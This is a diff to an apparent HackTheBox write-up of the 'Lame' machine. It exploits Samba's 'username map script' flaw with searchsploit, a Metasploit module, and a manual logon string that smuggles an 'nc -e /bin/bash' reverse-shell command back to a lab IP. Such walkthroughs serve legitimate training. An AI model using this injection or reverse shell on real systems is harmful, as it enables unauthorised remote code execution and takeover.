@@ -6,13 +6,18 @@ title: HackTheBox Write-up - Lame
 category: hackthebox
 tags: [ 'samba' ]
 ---
-Summary:
-This machine is easy ranked machine and exploited through metasploit module. A initial nmap scan result will shows us a vulnerable smaba service which is running on port 139.
+
+**DIGEST**
+
+An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. It's vulnerable to the "Samba username map script" vulnerability and exploited using both Manual and Metasploit module.
 
 <html>
 
 <head>
     <style>
+    b {
+  font-weight: bold;
+}
         table {
             font-family: arial, sans-serif;
             border-collapse: collapse;
@@ -64,7 +69,52 @@ This machine is easy ranked machine and exploited through metasploit module. A i
             </tbody>
         </table>
     </p>
-
 </body>
-
 </html>
+
+
+**Tools Used:**
+
+>Nmap, Searchsploit, Metsaploit
+
+
+**Initial Scan with Nmap:**
+
+![lame](../../../../img/htb/lame/lame-nmap.png)
+
+![lame-nmap](../../../../img/htb/lame/lame-nmap-result.png)
+
+**Vulnerable Samba service on port 139:**
+
+This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!
+
+**Searchsploit:**
+
+> $ searchsploit Samba 3.0.20
+
+![Searchsploit](../../../../img/htb/lame/lame-sp.png)
+
+**MSF Module - Samba "username map script" Command Execution:**
+
+> $ msf> use exploit/multi/samba/usermap_script
+
+![msf](../../../../img/htb/lame/lame-msf.png)
+
+![shell](../../../../img/htb/lame/lame-msf2.png)
+
+![root](../../../../img/htb/lame/lame-hash.png)
+
+**Manual Exploitation:**
+
+> logon “./=`nohup nc -e /bin/bash 10.10.14.18 4444`"
+
+![Manual](../../../../img/htb/lame/lame-manual1.png)
+
+![Manualroot](../../../../img/htb/lame/lame-manual1.png)
+
+**Rate Matrix:**
+
+![matrix](../../../../img/htb/lame/lame-matrix.png)
+
+<h5><center>Thanks for reading ❤️! </center></h5>
+<h5><center>Feel free to leave a comment 💬 below.</center></h5>
